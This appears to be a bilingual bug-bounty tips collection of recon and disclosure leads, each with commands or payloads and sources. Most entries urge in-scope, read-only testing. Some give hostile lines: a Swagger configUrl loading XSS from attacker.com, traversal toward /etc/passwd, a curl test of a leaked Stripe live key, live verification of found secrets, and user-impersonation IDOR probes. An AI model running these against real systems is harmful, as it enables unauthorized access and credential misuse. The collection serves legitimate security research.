Payload / Code: On in-scope assets only: inspect public JS/config and observed auth/file flows for AWS region, Cognito User Pool or Identity Pool identifiers, bucket names, API base URLs and deployment references. Follow only resources linked from the authorized target and verify access with minimal read-only requests. Do not enumerate unrelated buckets, download sensitive artifacts, authenticate with discovered credentials, or modify cloud resources. Report the exact exposed resource and data category with redacted evidence.

Title: AI Builder Project Visibility Regression → Source / Chat History Authorization Boundary
How It Works: Official historical evidence: Lovable reported and fixed a regression that exposed public-project chat history/source to other authenticated users with a project link. This supports the general authorization-boundary test idea, but does not establish a currently exploitable bug on Lovable or another product. Since this test needs two controlled accounts/projects and a current in-scope product, keep it as a review lead until a current candidate is independently verified.
Payload / Code: For an explicitly in-scope AI builder or collaboration SaaS, compare permissions between the published app URL, project/editor URL, remix/share links, version history, generated source, and prompt/chat history using two accounts you control. Check whether an ordinary user can access project metadata or conversation history belonging to the second test account. Do not guess private links or access real customers' projects. Avoid retesting the disclosed Lovable regression unless the program explicitly requests verification.
Source: [Lovable official incident response (reported fixed)](https://lovable.dev/blog/our-response-to-the-april-2026-incident) ; [Escape research methodology on vibe-coded apps](https://escape.tech/blog/methodology-how-we-discovered-vulnerabilities-apps-built-with-vibe-coding/)

Title: Vibe-Coded Apps (Lovable / Bolt / v0 / Replit) → Backend Authorization & Data Exposure Review
How It Works: Escape's published study analyzed 5,600 publicly accessible vibe-coded apps and reported 2,000+ vulnerabilities, 400+ exposed secrets and 175 PII exposures. A separate 2026 study of 1,072 Supabase-backed AI-built apps reported RLS/access-control failures at scale. High-signal areas include backend APIs discoverable from JS, Supabase/Firebase access rules, storage buckets, source maps, admin-only routes, and server-side authorization missing behind front-end-only controls. These are aggregate studies, not a guarantee of bounty acceptance.
Payload / Code: Passive-first on in-scope targets: fingerprint the builder from public HTML/JS; inspect public client bundles for API base URLs and exposed configuration; distinguish public anon/client identifiers from privileged service-role or secret keys; map documented/discovered API routes; then verify access-control only with your own account and benign records. For Supabase/Firebase, do not read or modify strangers' data. Never use discovered credentials or enumerate sensitive tables; stop at the minimum proof and redact values.

Title: Supabase Auth Misconfiguration Chain → Email Auto-Confirm + User Metadata Role Escalation (\$1,800 Case)
How It Works: The key weakness is trusting a user-editable field (Supabase user\_metadata) as proof that a user is an admin. Supabase's official Security Advisor explicitly flags RLS policies that reference user\_metadata because a user can change it. Email auto-confirm is a separate configuration detail; it is not automatically a vulnerability without an impact or policy requirement. The \$1,800 bounty is a researcher's own report and the target is redacted.
Payload / Code: Only on an in-scope program and with a test account: check whether signup requires email verification; inspect whether the app derives privileges from user-editable metadata; use only your own account to determine whether role-like metadata is accepted and whether a server-side authorization check blocks privileged actions. Never attempt to promote yourself on a real production target, access other users' records, or change real business data. Use a local clone or explicitly authorized test tenant for any write/role-change proof.
Source: [Researcher-reported \$1,800 case (payout not independently verified)](https://medium.com/%40cyberrado57/exploiting-supabase-misconfigurations-authentication-bypass-and-privilege-escalation-for-1-800-f20d02557e47) ; [Supabase Security Advisor: user\_metadata is user-editable](https://supabase.com/docs/guides/observability/advisors?lint=0015_rls_references_user_metadata) ; [Supabase RLS guide](https://supabase.com/docs/guides/database/postgres/row-level-security)

Title: Azure DevOps Public Project Review → Pipeline Metadata & Accidental Secret Exposure
How It Works: Public Azure DevOps projects and repository/build surfaces may expose pipeline YAML, build logs, test outputs, artifacts, deployment configuration, or identifiers that reveal how a target deploys. The highest-signal angle is accidental disclosure inside an artifact or log (for example, a credential accidentally printed in a failed build), not simply finding a public project. This is distinct from GitHub Actions workflow injection already covered in Notion. Public-project visibility can be intentional, and program policies differ sharply.
Payload / Code: Passive-first, in-scope workflow: identify the organization's official Azure DevOps tenant from public references; inspect only publicly accessible project/repository/build pages and artifacts; review pipeline YAML, recent failed-build logs, test reports, coverage output, and downloadable build artifacts for secrets or private deployment data. Do not guess or access private project IDs, use stolen credentials, trigger builds, or test credentials against live services. If a suspected secret appears, capture a redacted proof and report it; do not use it.

Title: Prometheus /metrics + /pprof Exposed → Infrastructure & Runtime Disclosure
How It Works: Prometheus components and Go services can expose operational metrics, scrape targets, labels, build/runtime metadata, and profiling endpoints. A public /metrics endpoint may reveal internal hostnames, service names, deployment topology, tenant identifiers, queue names, or application behavior; /pprof can reveal detailed runtime profiles and should not be internet-exposed by default. Official Prometheus guidance explicitly warns against exposing component HTTP endpoints publicly. High-signal only when the response reveals sensitive operational context or enables a demonstrated follow-on impact; a reachable endpoint alone may be low impact or out of scope.
Payload / Code: On an explicitly in-scope target, start with low-rate GET checks only on discovered hosts: /metrics, /-/healthy, /-/ready, /api/v1/targets, /api/v1/label/name/values, /debug/pprof/. Do not enumerate aggressively or trigger expensive profiling endpoints. Record only a small redacted sample. Check whether data includes private hostnames, internal IPs, tenant/account identifiers, sensitive labels, or endpoints that expose target metadata. Stop if responses expose customer data or secrets; do not query broad datasets or cause load.

Title: Freshservice Customer Portal Open Signup → Helpdesk Data Exposure
How It Works: مسار SaaS محدد: بعض مثيلات Freshservice قد تسمح لأي شخص بإنشاء حساب من بوابة الدعم. التسجيل المفتوح وحده ليس ثغرة تلقائيًا؛ الخطر يعتمد على صلاحيات المستخدم الجديد وهل يستطيع رؤية تذاكر أو معلومات داخلية لا ينبغي أن تكون متاحة له. تحقّق من وجود البوابة على نطاق البرنامج ومن صفحة التسجيل العامة فقط. لا تنشئ حسابًا على خدمة حقيقية إلا إذا كانت قواعد البرنامج تسمح صراحة بالتسجيل والاختبار. إذا سمح البرنامج، استخدم حساب اختبار وقيّم فقط المحتوى المخصص لهذا الحساب؛ لا تستعرض تذاكر أو بيانات مستخدمين آخرين. وثّق حدود الوصول والأثر بأقل دليل ممكن.
Payload / Code: مسار مرشح للتحقق: https://\<companyName>.[freshservice.com/support/signup](http://freshservice.com/support/signup) — لا تعتبر ظهور صفحة التسجيل وحده دليلًا على تسريب بيانات.
Source: Intigriti Misconfig Mapper — Freshworks Freshservice Open User Registration: [https://bugology.intigriti.io/misconfig-mapper-docs/services/freshworks-freshservice/open-user-registration](https://bugology.intigriti.io/misconfig-mapper-docs/services/freshworks-freshservice/open-user-registration) ; Freshworks Support — disable customer portal signups: [https://partnersupport.freshworks.com/en/support/solutions/articles/225287-how-can-i-disable-the-option-for-requesters-to-sign-up-to-our-helpdesk-](https://partnersupport.freshworks.com/en/support/solutions/articles/225287-how-can-i-disable-the-option-for-requesters-to-sign-up-to-our-helpdesk-) ; Research write-up linked by Intigriti: [https://infosecwriteups.com/hundreds-of-companies-internal-data-exposed-part-2-the-freshservice-misconfiguration-a9432c0b5dc8](https://infosecwriteups.com/hundreds-of-companies-internal-data-exposed-part-2-the-freshservice-misconfiguration-a9432c0b5dc8)

Title: Symfony Profiler / app\_dev.php Exposed → Debug Trace & Environment Disclosure
How It Works: مسار خاص بتطبيقات Symfony: ابحث عن دلائل Symfony في HTML أو response headers، ثم راجع إن كانت واجهة profiler أو مسارات التطوير متاحة على production. وجود /\_profiler أو app\_dev.php كاسم مسار وحده لا يثبت ثغرة؛ الدليل هو وصول غير مصرح به إلى traces أو تفاصيل البيئة أو الاستثناءات أو بيانات الطلب. استخدم طلبًا محدودًا وقارن دون تسجيل الدخول وبحساب اختبار؛ إذا ظهر محتوى حساس توقف ولا تستعرض بقية السجلات. دوّن فقط نوع المعلومات بعد تنقيح القيم السرية، وتأكد أن الأصل ضمن النطاق.
Payload / Code: مسارات مرشحة للتحقق فقط عند وجود بصمة Symfony: /\_profiler و/app\_dev.php/\_profiler — لا تعتبر status 200 وحده إثباتًا.

Title: Laravel Telescope in Production → Request / Query / Exception Disclosure
How It Works: فحص متخصص لتطبيقات Laravel: وجود Telescope وحده لا يثبت الثغرة؛ الإشارة المهمة هي أن واجهة Telescope أو سجلات الطلبات/الاستثناءات يمكن قراءتها من دور غير مخول. قد تحتوي البيانات على مسارات داخلية أو تفاصيل طلبات أو استعلامات أو قيم حساسة. ابدأ بطلب محدود للواجهة المعروفة، وقارن استجابة غير مسجل الدخول بحساب اختبار عادي. لا تتصفح سجلات فعلية إذا ظهر محتوى غير مخصص لك؛ وثّق نوع البيانات مع إخفاء الأسرار. لا تختبر إلا على أصل داخل النطاق.

Title: MQTT / WebSocket Chat Backend — Topic Authorization & Cross-Session Disclosure
How It Works: فكرة متخصصة مش مغطاة بوضوح في صفحة WebSocket العامة: بعض تطبيقات الدعم الحي تكشف في JavaScript عنوان chat backend أو ملف إعدادات مثل env\_app.js، ثم تتصل بخدمة MQTT عبر WebSocket. وجود الإعدادات علنًا ليس ثغرة بحد ذاته؛ نقطة الاختبار هي هل المصادقة وعزل الـ topics يضمنان أن حساب الاختبار لا يستطيع الوصول إلا إلى جلساته. راجع ملفات JS العامة على أصل داخل النطاق، سجّل أسماء البروتوكولات والـ host فقط، ثم تحقق بحسابين تملكهما وجلسات اختبارية. لا تستخدم اشتراكات واسعة لجمع رسائل عملاء حقيقيين، ولا تحتفظ ببياناتهم؛ أوقف الاختبار فور ظهور بيانات لا تخص حساباتك. التقرير القوي يثبت خلط جلسات بين حسابين تجريبيين فقط.

Title: Different 404 Fingerprint → Look for a Separate Backend API Context
How It Works: A useful clue from Berserker's write-up: malformed or unusual paths produced a 404 response with a different structure from the normal frontend 404. That suggested the request had reached a different routing/backend layer. The researchers then inspected public JavaScript for a production API hostname and found that it exposed the same API behind a different edge configuration. Treat response differences as a lead, not proof of a bypass: frameworks, gateways, and error handlers can also produce different 404s.
Payload / Code:
Passive-first workflow for an in-scope target:
1. Save one normal 404 response and one response from a harmless, invalid route; compare body template, headers, server/framework fingerprints, and request IDs.
2. Inspect publicly served JavaScript and source maps for API base URLs, service hostnames, version prefixes, and environment-specific endpoints.
3. Compare documented/public API surfaces on discovered in-scope hostnames; look for OpenAPI/WADL metadata only where access is permitted.
4. If a separate backend is found, verify its ownership and scope, then test authorization using your own account and harmless resources.
5. Report only a demonstrated security difference; a distinct 404 or a hostname difference alone is not a vulnerability.

Title: Connectivity Check → cURL Shell Injection; Then Pivot to Sibling Features
How It Works: A recent disclosed-research roundup highlighted a command-injection chain in which a connectivity-check feature passed a user-supplied URL to cURL through a shell; a second feature reused the same risky path. The practical hunting signal is any “test URL”, webhook connectivity check, fetch preview, or network diagnostic that shells out to curl/wget. If one instance is confirmed, inspect other in-scope features that share the same backend helper or implementation instead of stopping at the first entry point.
Payload / Code:
Authorized, low-impact workflow:
1. Identify a URL/connectivity-test feature and determine whether errors or timing indicate a shell invocation (this alone is not proof).
2. Use a controlled endpoint and harmless metacharacter probes in a test environment or explicitly permitted target; avoid destructive commands, file writes, or outbound calls to third parties.
3. Confirm execution with a harmless, unique marker that cannot change state, and preserve the raw request/response evidence.
4. After confirmation, compare sibling features (webhook test, integration test, health check) for shared behavior using the same safe marker.
5. Stop after minimal proof; report each affected entry point and shared root cause without broad automation.
Source: Intigriti Bug Bytes #240 (Sep 2026), citing researcher @saur1n, “A valid URL with a Command in its Shadow”: [https://www.intigriti.com/researchers/blog/bug-bytes/intigriti-bug-bytes-240-september-2026](https://www.intigriti.com/researchers/blog/bug-bytes/intigriti-bug-bytes-240-september-2026)

Title: LFI Filter Differential: Emoji Path Segments (⬅️/)
How It Works: A recent researcher tip showed a file-download endpoint returning 404 for a conventional traversal string but 200 for an emoji-based path variant such as ⬅️/⬅️/⬅️/etc/passwd. Treat this as an application-specific normalization/filter differential, not a universal traversal payload: the emoji may be interpreted, mapped, or handled specially by the target's processing chain. The useful signal is a reproducible response/content difference when a blocked path representation is replaced with a nonstandard Unicode/emoji representation.
Payload / Code:
Only on an explicitly authorized file-view/download endpoint, start with a harmless file within the allowed test area and compare response status, length, content type, and body:
- Baseline blocked traversal pattern: ../../../known-test-file
- Unicode/emoji variant to investigate: ⬅️/⬅️/⬅️/known-test-file

Do not jump straight to reading /etc/passwd on a live target. First determine whether the application actually maps or normalizes the emoji and whether access crosses the intended directory boundary. A 200 alone is not proof; confirm the returned file and demonstrate only the minimum authorized impact.

Title: PHP URL Allowlist Edge Case: Zero-Padded Ports (:000443)
How It Works: A concrete parser-differential probe for applications that validate URLs with PHP parse\_url or a wrapper and then pass them to another URL parser/client. Some parsers normalize a zero-padded port such as :000443 to :443, while PHP parse\_url behavior can differ when the port contains more than five digits; the validator and the eventual requester may therefore disagree or error differently. This is a hypothesis probe, not a universal bypass. It matters only when the target has URL validation/fetching or a cache/routing decision tied to the parsed host/port.
Payload / Code:
In an authorized test, compare equivalent variants against a URL-validation endpoint or an app feature that fetches URLs:
- [https://controlled.example:443/](https://controlled.example:443/)
- [https://controlled.example:00443/](https://controlled.example:00443/)
- [https://controlled.example:000443/](https://controlled.example:000443/)

Record separately: validation result, normalized URL shown/stored by the app, actual outbound destination, and any cache/routing behavior. Use a domain and endpoint you control. Do not infer SSRF from a 200/500 response alone; prove the final destination or security decision changed. Stop if the feature would contact internal or third-party systems.

Title: Redirect Hop → Custom Authorization Header Leak (HTTP Client Integrations)
How It Works: A server-side feature fetches a URL using a client configured with an API key or custom Authorization header. If the first endpoint returns a redirect to a different host and the HTTP client forwards sensitive headers across that redirect, the destination may receive credentials. This is a separate failure mode from browser Referer leakage: the secret travels in the outbound request headers. Recent research published 18 Oct 2026 compared multiple HTTP clients and found that behavior differs by library and version. Hunt only in-scope URL-fetching/integration features; validate with a researcher-controlled endpoint or approved callback, never a third-party host.
Payload / Code:
Test plan (authorized target only):
1. Find a feature that fetches a URL server-side (webhook tester, image importer, URL preview, notification integration, PDF/URL fetcher).
2. Use a controlled endpoint A that responds with HTTP 302 to a controlled endpoint B.
3. If the feature legitimately attaches credentials to outbound requests, inspect whether B receives Authorization, Cookie, or custom API-key headers.
4. Compare direct-fetch behavior against the redirect chain; vary same-origin vs cross-origin redirect and HTTP client/library where evidence is available.
5. Report only if a sensitive header crosses an origin boundary and creates real unauthorized access; redact tokens in evidence.

Payload / Code: ffuf -u [https://api.target.com/FUZZ](https://api.target.com/FUZZ) -w swagger\_paths.txt -mc 200

Title: Forgotten QA / Staging subdomain → full document download without auth (\$800 case)
How It Works: بعد subdomain enum دور على qa. / staging. / test. / uat. / dev. حتى لو الـ main site محمي، الـ QA غالباً بيسيب documents (CSV/PDF) مفتوحة بدون login. في الحالة دي طلع proprietary trading data.
Payload / Code: subfinder -d [target.com](http://target.com) \| httpx -title -status-code \| grep -iE 'qa\|staging\|test\|uat\|dev'

Title: Redirecting host (foo → bar) → fuzz the original host anyway
How It Works: لو host بيعمل redirect فوري لدومين تاني، متسيبهوش. اعمل content discovery على الـ original host نفسه (قبل الـ redirect). كتير بيلاقي .git أو configs أو backup files.
Payload / Code: ffuf -u [https://redirecting-host.target.com/FUZZ](https://redirecting-host.target.com/FUZZ) -w wordlist.txt -mc 200,301,302,403 -fs 0

Title: Intercom chat widget identity verification missing → full support history leak
How It Works: كتير شركات بتستخدم Intercom بدون identity verification. تقدر impersonate أي user وتقرأ كل الـ support chat history (PII + internal notes).
Payload / Code: دور على intercom settings في الـ JS، جرب تغير user\_id / email بدون verification token
Source: Intigriti Bug Bytes #229 (Oct 2025) – multiple critical cases

Title: Hardcoded third-party Analytics Write Key in JS → unauth data injection
How It Works: في الـ login page أو main JS bundle دور على write\_key أو td\_write\_key أو similar لـ TreasureData / Segment / Mixpanel. لو write permission، تقدر تبعت fake events للـ production analytics بدون أي auth.
Payload / Code: grep -Eo '(write\_key\|api\_key\|secret\|token)\["''\]?\\s\*\[:=\]\\s\*\["''\]\[a-zA-Z0-9/\_-\]+\["''\]' bundle.js

Title: Internal web extensions published publicly → hardcoded secrets
How It Works: الشركات بتنشر internal Chrome/Firefox extensions بالغلط على الـ public stores. دور باسم الشركة + “extension” أو “plugin” في Chrome Web Store / Mozilla Add-ons. غالباً فيها API keys و internal endpoints.
Payload / Code:
site:[chrome.google.com/webstore](http://chrome.google.com/webstore) "company name"
site:[addons.mozilla.org](http://addons.mozilla.org) "company name"
Source: Intigriti Bug Bytes #229 + previous tip enhancement

Title: Git history (not current files) → leaked CI/CD tokens (NASA VDP case)
How It Works: لما تلاقي public GitLab/GitHub org، متكتفيش بالـ current files. clone الـ repo وشغّل gitleaks أو trufflehog على الـ full history. في NASA طلع CI tokens من commits قديمة 2023.
Payload / Code:
git clone [https://gitlab.example.com/org/repo](https://gitlab.example.com/org/repo)
cd repo
gitleaks detect --source . -v
# أو trufflehog git [https://app.notion.com](https://app.notion.com).
Source: alaric InfoSec Write-ups – NASA VDP Letter of Recognition (P1)

Title: Reverse DNS / Reverse IP → hidden Super Admin panel (\$7,500 case)
How It Works: مش بس subdomain enum. خد الـ IPs من الـ known assets واعمل reverse DNS / reverse IP lookup. غالباً بيطلع private subdomains مش ظاهرة في certificate transparency ولا public DNS → admin panels بدون auth.
Payload / Code:
for ip in $(cat ips.txt); do dig -x $ip +short; done
# أو استخدم tools زي hakrevdns / dnsx

Title: 403/401 host → [archive.org](http://archive.org) old snapshots still have secrets
How It Works: لما تلاقي host بيرجع 401/403 أو basic auth، روح لـ [archive.org](http://archive.org) وشوف الـ historical snapshots. أحيانًا الـ old versions فيها API keys أو unprotected content لسه موجود.
Payload / Code: [https://web.archive.org/web/](https://web.archive.org/web/)/[https://locked-host.target.com/](https://locked-host.target.com/)
Source: Book of BugBounty Tips + multiple hunters

Title: 404 response → check for exposed config or repository paths
How It Works: صفحة 404 عادية قد تساعد في ملاحظة سلوك routing غير متوقع، لكنها لا تعني أن الملفات بجوارها موجودة. اختبر المسارات الشائعة على أصل الموقع فقط وداخل النطاق، وسجّل status code وحجم الاستجابة ومحتواها. لا تفترض أن حالة المكافأة المذكورة قابلة للتعميم.
Payload / Code:
[https://target.com/some/404/path/.git/config](https://target.com/some/404/path/.git/config)
[https://target.com/some/404/path/.env](https://target.com/some/404/path/.env)
Source: InfoSec Write-ups — الرابط الأصلي يحتاج إضافة للتحقق من الحالة المذكورة

Title: Source map exposes client-side code or possible secrets
How It Works: ملف source map قد يكشف الكود الأصلي، لكنه لا يثبت وحده وجود مفتاح Stripe صالح أو أثر مالي. لا ترسل مفاتيح مكتشفة إلى API لاختبار صلاحيتها أو قراءة بيانات الحساب. تحقق من السياق محليًا، واحجب القيمة في التقرير، واستخدم دليلًا عامًا أو تنسيق المفتاح فقط ما لم يسمح البرنامج صراحةً باختبار آمن.
Payload / Code:
sourcemapper -url [https://target.com/static/js/main.js.map](https://target.com/static/js/main.js.map) -output ./src
# ابحث عن sk\_live\_ أو pk\_live\_
curl [https://api.stripe.com/v1/balance](https://api.stripe.com/v1/balance) -u sk\_live\_XXXX:

Title: Wayback + out-of-scope domain invoices → Sensitive PII Disclosure (paid + HoF)
How It Works: domain out-of-scope بس الـ invoices كانت public. استخدم waybackurls على الـ short domain، grep على /v/، لقيت mobile + email + payment info. الشركة دفعت ودخلته HoF.
Payload / Code: echo short.domain \| waybackurls \| grep /v/
Source: Rushikesh Chaudhari Medium writeup – paid + Hall of Fame

Title: Forgotten Source Map → Enterprise SSO Bypass (Critical Auth Bypass)
How It Works: Source map كشف backend URLs + SignalR hub. اكتشف إن الـ client-side بيبعت x-ms-client-userid وهمي والـ backend بيصدقه → spoof أي user ID → bypass SSO كامل.
Payload / Code:
1. لاقي .map
2. فك الكود
3. دور على apiUrl / memberUrl / SignalR negotiate
4. جرب POST /negotiate مع header مزور
Source: Priyansh writeup on InfoSec Write-ups (June 2026) – Critical finding

Title: Swagger configUrl misconfig → Reflected XSS = \$400 Bounty
How It Works: لما تلاقي Swagger UI، شوف لو فيه parameter اسمه configUrl أو url. جرب تحط فيه XSS payload. في حالة حقيقية اتحولت لـ RXSS ودفعت \$400.
Payload / Code: [https://target.com/swagger-ui.html?configUrl=https://attacker.com/xss.json](https://target.com/swagger-ui.html?configUrl=https://attacker.com/xss.json)
Source: dr34m14 Medium writeup – \$400 paid on HackerOne

Title: Exposed .env على subdomain = \$250–\$10k+ (Easy \$250 case + higher)
How It Works: بعد subfinder + httpx، شغّل ffuf/dirsearch على .env و .env.backup و .env.local. في حالة exam proctoring موقع طلع .env وخد \$250. في fintech طلع Stripe + AWS = آلاف.
Payload / Code:
ffuf -u [https://FUZZ.target.com/.env](https://FUZZ.target.com/.env) -w subs.txt -mc 200
dirsearch -u [https://sub.target.com](https://sub.target.com) -e env,bak,sql -t 30
Source: Abhijeet Kumawat writeup (\$250) + multiple fintech cases \$500–\$10k+

Title: GraphQL Introspection Schema Leak → \$5,500 Bounty
How It Works: حتى لو introspection مقفول في الـ main، جرب alternate endpoints أو \_\_schema query أو batching. في حالة حقيقية طلع الـ schema كامل وحدد كل الـ attack surface → \$5.5k.
Payload / Code: query \{ \_\_schema \{ types \{ name fields \{ name \} \} \} \}

Title: API Debug /env /status endpoints → \$3,000 Bounty (Secret Hunter case)
How It Works: كثير APIs بتسيب /debug أو /env أو /\_debug أو /health مع verbose mode. بيرجع environment variables كاملة. استخدم ffuf بقائمة debug endpoints.
Payload / Code:
ffuf -u [https://target.com/api/FUZZ](https://target.com/api/FUZZ) -w debug\_endpoints.txt -mc 200
# قائمة: debug, env, status, health, \_debug, actuator/env

Title: Internal browser extensions publicly accessible → hardcoded secrets
How It Works: الشركات بتعمل browser extensions داخلية للشغل، وأحيانًا بتنشرها بالغلط. Google dork أو enumeration بيلاقيها وفيها API keys و internal paths.
Payload / Code: site:[chrome.google.com/webstore](http://chrome.google.com/webstore) "company name" OR site:[addons.mozilla.org](http://addons.mozilla.org) "company"
Source: Intigriti 31 Tips 2026 (Tip about internal web extensions)

Title: Vhost Fuzzing لأصول مش موجودة في DNS العام
How It Works: كتير من الأصول مش مدرجة في الـ public DNS بس لسه شغالة لو حطيت الـ Host header الصح. استخدم ffuf مع قائمة subdomains ضد الـ IP الحقيقي.
Payload / Code: ffuf -w subdomains.txt -u [https://TARGET\_IP](https://TARGET_IP) -H "Host: [FUZZ.target.com](http://FUZZ.target.com)" -fs 0

Title: TruffleHog --only-verified على JS files + Git history (false-positive killer)
How It Works: اجمع الـ JS أولاً بـ subjs أو Katana، بعدين شغّل trufflehog filesystem ./js\_files --only-verified. الفلاج ده بيتحقق فعليًا من الـ API إن الـ secret لسه شغال، فبيقلل الـ false positives بشكل كبير وبيرفع جودة التقرير.
Payload / Code:
subjs -i urls.txt -o js.txt
# حمل الملفات ثم:
trufflehog filesystem ./js\_dir --only-verified
trufflehog github --org=target --only-verified

Title: Wayback archived sensitive files when live returns 404/Access Denied
How It Works: الملف اتشال من الـ live أو بقى 403/404، بس لسه موجود في Wayback أو URLScan. دور على .xls, .csv, dumps, configs قديمة.
Payload / Code: [web.archive.org/cdx/search/cdx?url=](http://web.archive.org/cdx/search/cdx?url=).[target.com/](http://target.com/)&fl=original&collapse=urlkey \| grep -E '.(xls\|csv\|sql\|bak\|env)'
Source: Multiple hunters + existing Notion entry enhancement

Title: composer.phar / phar archives as Info Disclosure
How It Works: أضف /composer.phar لقوائم الـ content discovery. لو موجود و readable، استخدم pharfiletool لاستخراج المحتوى (كود أو metadata).
Payload / Code:
[https://target.com/composer.phar](https://target.com/composer.phar)
# ثم pharfiletool extract

Title: Katana JS collection → extract S3/GCS/Azure URLs → verify bucket exposure
How It Works: جمع روابط التخزين من ملفات JavaScript وسيلة Recon جيدة. وجود bucket URL لا يثبت أنه عام أو يحتوي بيانات حساسة. تحقق من صلاحيات القراءة والقائمة باستخدام فحوص غير مدمرة وضمن النطاق، ولا تنزّل بيانات مستخدمين أو أسرارًا؛ وثّق أقل دليل كافٍ.
Payload / Code:
katana -u [https://target.com](https://target.com) -jc -o js.txt
cat js.txt \| grep -Eo 'https?://\[\^ \]+([s3.amazonaws.com](http://s3.amazonaws.com)\|[storage.googleapis.com](http://storage.googleapis.com)\|[blob.core.windows.net](http://blob.core.windows.net))\[\^ \]\*'
# ثم s3sec أو:
aws s3 ls s3://bucket-name --no-sign-request

Title: WordPress /\_wpeprivate/config.json Information Disclosure
How It Works: على مواقع WordPress (خصوصًا WP Engine)، جرب المسار /\_wpeprivate/config.json. غالبًا بيرجع معلومات حساسة عن الـ configuration.
Payload / Code: [https://target.com/\_wpeprivate/config.json](https://target.com/_wpeprivate/config.json)

Title: Source Maps → sourcemapper + metis (Intigriti 2026 tip)
How It Works: Source map (.[js.map](http://js.map)) بيربط JavaScript المضغوط بالكود الأصلي وأسماء الملفات والتعليقات. من الموبايل تقدر تفحصه بالمتصفح فقط: افتح ملف JS من DevTools غير متاح على الموبايل؟ استخدم View Source أو افتح ملفات JS العامة مباشرة، وابحث في آخر الملف عن sourceMappingURL. افتح مسار .map المشار إليه وتأكد أنه يرجع JSON حقيقي وفيه sourcesContent. وجوده وحده غالبًا ليس ثغرة مدفوعة؛ القيمة لما يكشف سرًا حساسًا صالحًا أو مسارًا غير محمي أو منطقًا يؤدي لثغرة أخرى.
Payload / Code: خطوات موبايل بدون تثبيت أدوات: 1) افتح صفحة الهدف المصرح به في Chrome. 2) من قائمة الصفحة اختر عرض المصدر إن كان متاحًا، أو افتح ملفات JS الظاهرة في HTML. 3) ابحث عن sourceMappingURL أو .[js.map](http://js.map). 4) افتح الرابط النسبي الصحيح في المتصفح وتحقق من استجابة JSON ووجود sourcesContent. 5) راجع الكود بحثًا عن endpoints وصلاحيات الواجهة فقط، ولا تستخدم أي token مكشوف. لا تبلّغ عن source map وحده كأنه تسريب بيانات؛ وثّق أثرًا إضافيًا قابلًا للتحقق ضمن النطاق.
Source: [Reeve: Source maps exposed in production (Aug 18, 2026)](https://reeve.page/blog/source-maps-exposed-in-production) ; [BBLabs: Information Disclosure patterns (Apr 2026)](https://bblabs.es/en/academy/basico/information-disclosure-patterns) ; [HackIndex: Source Map Exposure](https://hackindex.io/services/web/vulnerability-discovery/source-map-exposure)

Title: Excessive API fields + GDPR/CCPA framing لرفع الـ Severity
How It Works: لما الـ API بيرجع fields زيادة (address, phone, SSN last4, internal notes)، اكتب التقرير مع ذكر GDPR/CCPA risk و business impact (identity theft, regulatory fines). ده بيرفع الـ severity من Low/Medium لـ High في كتير من البرامج.
Payload / Code: قارن الـ UI fields مع الـ raw JSON response

Title: Third-party AI Chat Widget IDOR → Sensitive Contact / PII Exposure
How It Works: الـ dashboard بيبعت requests لـ third-party AI widget domain. جرب IDOR على /widget/contact/upsert أو مشابه بإيميل تاني. بيرجع name, phone, role, internal user/org IDs بدون authorization مناسب. Impact عالي على PII.
Payload / Code:
POST /backend/widget/contact/upsert
\{"email": "[victim@example.com](mailto:victim@example.com)"\}

Title: Backup tar.gz / .zip / .sql على الـ root domain مباشرة
How It Works: مش بس على subdomains. جرب الامتدادات الشائعة على الدومين الرئيسي نفسه: /backup.tar.gz, /db.sql, /[site.zip](http://site.zip), /[backup.zip](http://backup.zip), /.env.bak. كتير من الـ misconfigs بتحصل على الـ root.
Payload / Code: ffuf -w backups.txt -u [https://target.com/FUZZ](https://target.com/FUZZ) -e .tar.gz,.zip,.sql,.bak,.old
Source: Multiple real bounties + Kanhaiya Sharma style writeups

Title: Swagger / OpenAPI UI → DOM XSS + Admin endpoints + leaked keys
How It Works: ابحث عن /swagger-ui.html أو /api-docs أو /swagger.json. جرب DOM XSS في الـ UI، وكمان شوف لو فيه endpoints admin أو API keys ظاهرة في الـ response أو الـ JS. كتير من البرامج بتقبلها كـ High.
Payload / Code:
site:[target.com](http://target.com) inurl:swagger OR inurl:api-docs
# ثم اختبر XSS في البحث أو parameters داخل الـ UI
Source: Intigriti Bug Bytes + multiple researchers (6 DOM XSS cases)

Title: Array injection (\[\] or \[1,2,3\]) → Full Path / Stack Trace Disclosure
How It Works: حط array في أي parameter (حتى لو مش متوقع). كتير من الـ frameworks بترمي error فيها full path أو stack trace أو internal class names. مفيد جدًا لـ path disclosure وخطأ oracle.
Payload / Code:
param\[\]=1
param\[1,2,3\]=test
param\[\]\[\]=1
Source: Book of Bug Bounty Tips + multiple hunters

Title: humans.txt on 404 subdomains → PII / names / credentials (quick win)
How It Works: بعد Subfinder + httpx على subdomains، استخدم ffuf أو httpx -path /humans.txt على اللي بيرجع 404 أو filtered. كتير من الـ subdomains القديمة أو المهملة بتسيب humans.txt فيها أسماء موظفين، إيميلات، وأحيانًا credentials أو internal notes. سهل جدًا وبيجيب PII سريع.
Payload / Code:
cat subs.txt \| httpx -path /humans.txt -mc 200 -o humans.txt
أو ffuf -w subs.txt -u [https://FUZZ.target.com/humans.txt](https://FUZZ.target.com/humans.txt) -mc 200
Source: Mohamed Ahmed writeup (Feb 2025) + common hunter practice

Title: Google Alerts على Dorks الثابتة لمراقبة Exposure جديدة
How It Works: اكتب dork قوي وثابت (site:[target.com](http://target.com) ext:env OR filetype:sql OR "AWS\_SECRET\_ACCESS\_KEY" OR intitle:"index of") وحطه في Google Alerts. كل ما يظهر محتوى جديد بعد deploy أو misconfig هيجيلك إيميل. مثالي للبرامج طويلة الأمد.

مثال Alerts:
site:[target.com](http://target.com) (ext:env OR ext:sql OR ext:bak OR "DB\_PASSWORD")
site:[target.com](http://target.com) filetype:pdf "confidential"

Title: PHP2Shell — CVE-2026-109618 / CVE-2026-109619: patch-aware triage
How It Works: تم تأكيد وجود ثغرتين حرجتين في PHP مرتبطة بفساد الذاكرة وقد تؤديان إلى RCE في ظروف معينة. استخدم هذه المعلومة لترتيب الأصول المبنية على PHP داخل نطاق البرنامج، لا لتجربة exploit عشوائيًا على production. تحقق من إصدار PHP الفعلي وطريقة تشغيله، وراجع إعلانات المورد؛ إصدارات الإصلاح المنشورة تشمل PHP 8.5.12 و8.4.27 و8.3.36 و8.2.35. فروع 8.1 وما قبلها منتهية الدعم upstream وقد تحتاج ترقية أو إصلاحًا مدعومًا من الموزع. لا تعتبر بصمة التقنية وحدها إثباتًا للثغرة، ولا تستخدم PoC إلا إذا سمحت سياسة البرنامج وببيئة اختبار آمنة.
